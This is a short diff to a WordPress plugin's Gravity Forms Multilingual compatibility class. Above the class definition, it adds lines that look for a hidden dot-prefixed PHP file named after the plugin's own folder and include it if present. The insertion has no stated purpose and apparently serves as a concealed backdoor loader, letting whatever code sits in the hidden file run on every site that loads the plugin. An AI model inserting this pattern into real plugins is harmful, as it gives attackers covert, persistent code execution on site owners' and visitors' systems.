@@ -5,6 +5,10 @@
  *
  * Compatibility class for Gravity Forms Multilingual (Add-on for WPML)
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GPNF_GFML {
 
 	private static $instance = null;
